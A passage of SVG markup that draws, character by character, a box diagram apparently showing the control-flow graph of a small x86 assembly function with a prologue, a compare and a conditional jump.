<text text-anchor='middle' x='120' y='292' fill='currentColor' style='font-size:1em'>w</text>
<text text-anchor='middle' x='120' y='324' fill='currentColor' style='font-size:1em'>L</text>
<text text-anchor='middle' x='120' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='128' y='4' fill='currentColor' style='font-size:1em'>┌</text>
<text text-anchor='middle' x='128' y='20' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='128' y='36' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='128' y='52' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='128' y='68' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='128' y='84' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='128' y='100' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='128' y='116' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='128' y='132' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='128' y='148' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='128' y='164' fill='currentColor' style='font-size:1em'>└</text>
<text text-anchor='middle' x='128' y='244' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='128' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='128' y='292' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='128' y='324' fill='currentColor' style='font-size:1em'>4</text>
<text text-anchor='middle' x='128' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='128' y='372' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='128' y='388' fill='currentColor' style='font-size:1em'>└</text>
<text text-anchor='middle' x='136' y='4' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='136' y='164' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='136' y='244' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='136' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='136' y='292' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='136' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='136' y='388' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='144' y='4' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='144' y='20' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='144' y='52' fill='currentColor' style='font-size:1em'>m</text>
<text text-anchor='middle' x='144' y='84' fill='currentColor' style='font-size:1em'>m</text>
<text text-anchor='middle' x='144' y='116' fill='currentColor' style='font-size:1em'>c</text>
<text text-anchor='middle' x='144' y='148' fill='currentColor' style='font-size:1em'>j</text>
<text text-anchor='middle' x='144' y='164' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='144' y='244' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='144' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='144' y='292' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='144' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='144' y='388' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='152' y='4' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='152' y='20' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='152' y='52' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='152' y='84' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='152' y='116' fill='currentColor' style='font-size:1em'>m</text>
<text text-anchor='middle' x='152' y='148' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='152' y='164' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='152' y='244' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='152' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='152' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='152' y='388' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='160' y='4' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='160' y='20' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='160' y='52' fill='currentColor' style='font-size:1em'>v</text>
<text text-anchor='middle' x='160' y='84' fill='currentColor' style='font-size:1em'>v</text>
<text text-anchor='middle' x='160' y='116' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='160' y='148' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='160' y='164' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='160' y='244' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='160' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='160' y='292' fill='currentColor' style='font-size:1em'>[</text>
<text text-anchor='middle' x='160' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='160' y='388' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='168' y='4' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='168' y='20' fill='currentColor' style='font-size:1em'>h</text>
<text text-anchor='middle' x='168' y='164' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='168' y='244' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='168' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='168' y='292' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='168' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='168' y='388' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='176' y='4' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='176' y='52' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='176' y='84' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='176' y='116' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='176' y='148' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='176' y='164' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='176' y='244' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='176' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='176' y='292' fill='currentColor' style='font-size:1em'>b</text>
<text text-anchor='middle' x='176' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='176' y='388' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='184' y='4' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='184' y='20' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='184' y='52' fill='currentColor' style='font-size:1em'>b</text>
<text text-anchor='middle' x='184' y='84' fill='currentColor' style='font-size:1em'>w</text>
<text text-anchor='middle' x='184' y='116' fill='currentColor' style='font-size:1em'>w</text>
<text text-anchor='middle' x='184' y='148' fill='currentColor' style='font-size:1em'>L</text>
<text text-anchor='middle' x='184' y='164' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='184' y='244' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='184' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='184' y='292' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='184' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='184' y='388' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='192' y='4' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='192' y='20' fill='currentColor' style='font-size:1em'>b</text>
<text text-anchor='middle' x='192' y='52' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='192' y='84' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='192' y='116' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='192' y='148' fill='currentColor' style='font-size:1em'>2</text>
<text text-anchor='middle' x='192' y='164' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='192' y='180' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='192' y='212' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='192' y='228' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='192' y='244' fill='currentColor' style='font-size:1em'>┘</text>
<text text-anchor='middle' x='192' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='192' y='292' fill='currentColor' style='font-size:1em'>-</text>
<text text-anchor='middle' x='192' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='192' y='388' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='192' y='436' fill='currentColor' style='font-size:1em'>┌</text>
<text text-anchor='middle' x='192' y='452' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='192' y='468' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='192' y='484' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='192' y='500' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='192' y='516' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='192' y='532' fill='currentColor' style='font-size:1em'>└</text>
<text text-anchor='middle' x='200' y='4' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='200' y='20' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='200' y='52' fill='currentColor' style='font-size:1em'>,</text>
<text text-anchor='middle' x='200' y='84' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='200' y='116' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='200' y='164' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='200' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='200' y='292' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='200' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='200' y='388' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='200' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='200' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='208' y='4' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='208' y='84' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='208' y='116' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='208' y='164' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='208' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='208' y='292' fill='currentColor' style='font-size:1em'>x</text>
<text text-anchor='middle' x='208' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='208' y='388' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='208' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='208' y='452' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='208' y='484' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='208' y='516' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='208' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='216' y='4' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='216' y='52' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='216' y='164' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='216' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='216' y='292' fill='currentColor' style='font-size:1em'>8</text>
<text text-anchor='middle' x='216' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='216' y='388' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='216' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='216' y='452' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='216' y='484' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='216' y='516' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='216' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='224' y='4' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='224' y='52' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='224' y='84' fill='currentColor' style='font-size:1em'>[</text>
<text text-anchor='middle' x='224' y='116' fill='currentColor' style='font-size:1em'>[</text>
<text text-anchor='middle' x='224' y='164' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='224' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='224' y='292' fill='currentColor' style='font-size:1em'>]</text>
<text text-anchor='middle' x='224' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='224' y='388' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='224' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='224' y='452' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='224' y='484' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='224' y='516' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='224' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='232' y='4' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='232' y='52' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='232' y='84' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='232' y='116' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='232' y='164' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='232' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='232' y='292' fill='currentColor' style='font-size:1em'>,</text>
<text text-anchor='middle' x='232' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='232' y='388' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='232' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='232' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='240' y='4' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='240' y='84' fill='currentColor' style='font-size:1em'>b</text>
<text text-anchor='middle' x='240' y='116' fill='currentColor' style='font-size:1em'>b</text>
<text text-anchor='middle' x='240' y='164' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='240' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='240' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='240' y='388' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='240' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='240' y='484' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='240' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='248' y='4' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='248' y='84' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='248' y='116' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='248' y='164' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='248' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='248' y='292' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='248' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='248' y='388' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='248' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='248' y='484' fill='currentColor' style='font-size:1em'>b</text>
<text text-anchor='middle' x='248' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='256' y='4' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='256' y='84' fill='currentColor' style='font-size:1em'>-</text>
<text text-anchor='middle' x='256' y='116' fill='currentColor' style='font-size:1em'>-</text>
<text text-anchor='middle' x='256' y='164' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='256' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='256' y='292' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='256' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='256' y='388' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='256' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='256' y='484' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='256' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='264' y='4' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='264' y='84' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='264' y='116' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='264' y='164' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='264' y='180' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='264' y='212' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='264' y='228' fill='currentColor' style='font-size:1em'>└</text>
<text text-anchor='middle' x='264' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='264' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='264' y='388' fill='currentColor' style='font-size:1em'>┐</text>
<text text-anchor='middle' x='264' y='404' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='264' y='420' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='264' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='264' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='272' y='4' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='272' y='84' fill='currentColor' style='font-size:1em'>x</text>
<text text-anchor='middle' x='272' y='116' fill='currentColor' style='font-size:1em'>x</text>
<text text-anchor='middle' x='272' y='164' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='272' y='228' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='272' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='272' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='272' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='272' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='280' y='4' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='280' y='84' fill='currentColor' style='font-size:1em'>4</text>
<text text-anchor='middle' x='280' y='116' fill='currentColor' style='font-size:1em'>4</text>
<text text-anchor='middle' x='280' y='164' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='280' y='228' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='280' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='280' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='280' y='404' fill='currentColor' style='font-size:1em'>┌</text>
<text text-anchor='middle' x='280' y='420' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='280' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='280' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='288' y='4' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='288' y='84' fill='currentColor' style='font-size:1em'>]</text>
<text text-anchor='middle' x='288' y='116' fill='currentColor' style='font-size:1em'>]</text>
<text text-anchor='middle' x='288' y='164' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='288' y='228' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='288' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='288' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='288' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='288' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='288' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='296' y='4' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='296' y='84' fill='currentColor' style='font-size:1em'>,</text>
<text text-anchor='middle' x='296' y='116' fill='currentColor' style='font-size:1em'>,</text>
<text text-anchor='middle' x='296' y='164' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='296' y='228' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='296' y='276' fill='currentColor' style='font-size:1em'>┐</text>
<text text-anchor='middle' x='296' y='292' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='296' y='308' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='296' y='324' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='296' y='340' fill='currentColor' style='font-size:1em'>┘</text>
<text text-anchor='middle' x='296' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='296' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='296' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='304' y='4' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='304' y='164' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='304' y='228' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='304' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='304' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='304' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='312' y='4' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='312' y='84' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='312' y='116' fill='currentColor' style='font-size:1em'>2</text>
<text text-anchor='middle' x='312' y='164' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='312' y='228' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='312' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='312' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='312' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='320' y='4' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='320' y='164' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='320' y='228' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='320' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='320' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='320' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='328' y='4' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='328' y='164' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='328' y='228' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='328' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='328' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='328' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='336' y='4' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='336' y='164' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='336' y='228' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='336' y='276' fill='currentColor' style='font-size:1em'>┌</text>
<text text-anchor='middle' x='336' y='292' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='336' y='308' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='336' y='324' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='336' y='340' fill='currentColor' style='font-size:1em'>└</text>
<text text-anchor='middle' x='336' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='336' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='336' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='344' y='4' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='344' y='164' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='344' y='228' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='344' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='344' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='344' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='344' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='344' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='352' y='4' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='352' y='164' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='352' y='228' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='352' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='352' y='292' fill='currentColor' style='font-size:1em'>m</text>
<text text-anchor='middle' x='352' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='352' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='352' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='352' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='360' y='4' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='360' y='164' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='360' y='228' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='360' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='360' y='292' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='360' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='360' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='360' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='360' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='368' y='4' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='368' y='164' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='368' y='228' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='368' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='368' y='292' fill='currentColor' style='font-size:1em'>v</text>
<text text-anchor='middle' x='368' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='368' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='368' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='368' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='376' y='4' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='376' y='164' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='376' y='228' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='376' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='376' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='376' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='376' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='376' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='384' y='4' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='384' y='164' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='384' y='228' fill='currentColor' style='font-size:1em'>┐</text>
<text text-anchor='middle' x='384' y='244' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='384' y='260' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='384' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='384' y='292' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='384' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='384' y='404' fill='currentColor' style='font-size:1em'>─</text>
